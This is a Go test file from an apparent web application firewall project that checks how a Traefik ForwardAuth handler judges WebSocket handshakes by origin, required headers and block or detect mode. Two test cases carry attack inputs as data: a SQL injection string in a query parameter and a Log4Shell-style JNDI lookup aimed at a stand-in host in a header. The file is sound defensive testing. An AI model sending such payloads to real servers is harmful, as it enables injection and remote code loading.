// Copyright 2026 The Inkwall Authors
// SPDX-License-Identifier: Apache-2.0

package forwardauth

import (
	"bytes"
	"log/slog"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/inkwall-dev/inkwall/pkg/pipeline"
	"github.com/inkwall-dev/inkwall/pkg/rules/coraza"
)

// wsSubrequest is what Traefik's ForwardAuth sends for a WebSocket
// handshake: the client's headers but the hop-by-hop ones, so without
// Upgrade and Connection; Go's transport adds Accept-Encoding.
func wsSubrequest(uri string, kv ...string) *http.Request {
	r := subrequest(http.MethodGet, uri, "", "")
	r.Header.Del("Accept")
	r.Header.Set("Accept-Encoding", "gzip")
	r.Header.Set("Origin", "https://app.example.com")
	r.Header.Set("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ==")
	r.Header.Set("Sec-WebSocket-Version", "13")
	for i := 0; i+1 < len(kv); i += 2 {
		r.Header.Set(kv[i], kv[i+1])
	}
	return r
}

// TestWebSocketHandshake: Traefik asks before it upgrades, so a denied
// handshake gets the denial and no upgrade. The policy's WebSocket rules
// apply though Traefik drops the Upgrade header.
func TestWebSocketHandshake(t *testing.T) {
	ws, err := pipeline.CompileWebSocket(pipeline.WebSocketConfig{
		AllowedOrigins:  []string{"https://app.example.com"},
		RequiredHeaders: []string{"Sec-WebSocket-Protocol"},
	})
	if err != nil {
		t.Fatal(err)
	}
	eval, err := coraza.New(coraza.Config{})
	if err != nil {
		t.Fatal(err)
	}
	proto := []string{"Sec-WebSocket-Protocol", "chat"}
	tests := []struct {
		name string
		req  *http.Request
		want int
	}{
		{"allowed", wsSubrequest("/chat", proto...), http.StatusOK},
		{"forbidden origin", wsSubrequest("/chat", append(proto, "Origin", "https://evil.example")...), http.StatusForbidden},
		{"no origin", func() *http.Request { r := wsSubrequest("/chat", proto...); r.Header.Del("Origin"); return r }(), http.StatusForbidden},
		{"missing required header", wsSubrequest("/chat"), http.StatusForbidden},
		{"attack in the query", wsSubrequest("/chat?room=1%27%20OR%20%271%27%3D%271", proto...), http.StatusForbidden},
		{"attack in a header", wsSubrequest("/chat", "Sec-WebSocket-Protocol", "${jndi:ldap://evil.example/a}"), http.StatusForbidden},
		// Not a handshake: the WebSocket rules don't apply.
		{"plain request from another origin", func() *http.Request {
			r := subrequest(http.MethodGet, "/", "", "")
			r.Header.Set("Origin", "https://evil.example")
			return r
		}(), http.StatusOK},
	}
	for _, mode := range []pipeline.Mode{pipeline.ModeBlock, pipeline.ModeDetect} {
		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				var logs bytes.Buffer
				h, err := New(pipeline.New(eval, pipeline.Config{Mode: mode, Timeout: 10 * time.Second, WebSocket: ws}),
					Config{MaxBodyBytes: 64, Logger: slog.New(slog.NewJSONHandler(&logs, nil))})
				if err != nil {
					t.Fatal(err)
				}
				want := tt.want
				if mode == pipeline.ModeDetect {
					want = http.StatusOK
				}
				if w := serve(h, tt.req); w.Code != want {
					t.Fatalf("mode %d: got %d, want %d; events: %s", mode, w.Code, want, logs.String())
				}
				if logged := strings.Contains(logs.String(), "security event"); logged != (tt.want != http.StatusOK) {
					t.Fatalf("mode %d: events %q, want one only for a denial", mode, logs.String())
				}
			})
		}
	}
}
